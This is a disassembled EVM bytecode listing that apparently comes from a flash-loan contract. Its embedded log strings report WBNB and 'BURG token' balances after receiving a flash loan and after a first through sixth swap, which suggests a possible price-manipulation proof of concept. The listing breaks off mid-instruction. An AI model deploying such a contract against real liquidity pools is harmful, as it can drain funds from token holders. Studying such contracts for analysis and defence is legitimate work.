PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x317 JUMPI PUSH2 0x317 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE POP POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x359 JUMPI PUSH2 0x359 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x20 SWAP3 DUP4 MUL SWAP2 SWAP1 SWAP2 ADD SWAP1 SWAP2 ADD MSTORE PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x60 SWAP1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x3A7 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x3C4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x3EC SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x447 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x46B SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x4CE SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x33 SWAP1 DUP3 ADD MSTORE PUSH32 0x57424E422062616C616E6365206F6620636F6E74726163742061667465722072 PUSH1 0x60 DUP3 ADD MSTORE PUSH19 0x32B1B2B4BB3B34B73390333630B9B43637B0B7 PUSH1 0x69 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x4F8 JUMPI PUSH2 0x4F8 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x549 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x2B SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH11 0x10212AA923903A37B5B2B7 PUSH1 0xA9 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x5A7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5CB SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5D8 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x624 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x0 ADDRESS PUSH2 0x2986 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x657 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x674 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x69C SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x6C0 JUMPI PUSH2 0x6C0 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x723 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722031737420737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x781 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x7A5 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7B2 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x7EE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x821 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x83E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x866 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x88A JUMPI PUSH2 0x88A PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x8ED SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E20616674657220326E6420737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x94B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x96F SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x97C SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x9B8 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0x9EB SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA08 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xA30 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xA54 JUMPI PUSH2 0xA54 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0xAB7 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722033726420737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xB15 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB39 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB46 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xB82 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0xBB5 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBD2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xBFA SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xC1E JUMPI PUSH2 0xC1E PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0xC81 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722034746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xCDF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD03 SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD10 SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xD4C PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0xD7F SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xD9C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xDC4 SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xDE8 JUMPI PUSH2 0xDE8 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0xE4B SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722035746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEA9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xECD SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xEDA SWAP2 SWAP1 PUSH2 0x2DE5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xF16 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F9E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2F7E DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x614 JUMPI PUSH2 0x614 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x7C0329D PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x1F00CA74 SWAP1 PUSH2 0xF49 SWAP1 DUP7 SWAP1 DUP7 SWAP1 PUSH1 0x4 ADD PUSH2 0x2CED JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF66 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0xF8E SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x2D0E JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0xFB2 JUMPI PUSH2 0xFB2 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD PUSH1 0x40 MLOAD PUSH2 0x1015 SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x3C SWAP1 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FDE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0x204255524720746F6B656E2061667465722036746820737761703A2000000000 PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE 